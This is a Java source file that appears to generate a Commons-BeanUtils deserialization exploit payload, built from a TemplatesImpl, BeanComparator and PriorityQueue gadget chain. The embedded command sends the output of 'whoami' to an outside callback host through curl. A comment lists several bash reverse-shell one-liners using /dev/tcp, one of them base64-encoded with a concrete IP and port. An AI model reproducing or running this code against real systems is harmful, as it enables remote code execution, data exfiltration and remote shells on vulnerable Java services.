package util;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import javassist.*;

import org.apache.commons.beanutils.*;

import java.util.PriorityQueue;

public class CB1Utils {
    public static byte[] getBytes() throws Exception {
        /*
        exec 5<>/dev/tcp/ip/port;cat <&5 | while read line; do $line 2>&5 >&5; done
        bash -i >& /dev/tcp/ip/port 0>&1
        bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80OS4yMzIuMTkwLjEzMi85OTk5IDA+JjE=}|{base64,-d}|{bash,-i}
        */
        TemplatesImpl templates = GadgetUtils.getTemplatesImpl("curl http://bgb5eh.ceye.io?s=`whoami`");
//        TemplatesImpl templates=GadgetUtils.getDelayTemplatesImpl();
        final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
// stub data for replacement later
        queue.add("1");
        queue.add("1");

        ReflectionUtils.setFieldValue(comparator, "property", "outputProperties");
        ReflectionUtils.setFieldValue(queue, "queue", new Object[]{templates, templates});

        return SerializerUtils.serialize(queue);

    }

    public static void main(String[] args) throws Exception {
        getBytes();
    }

}
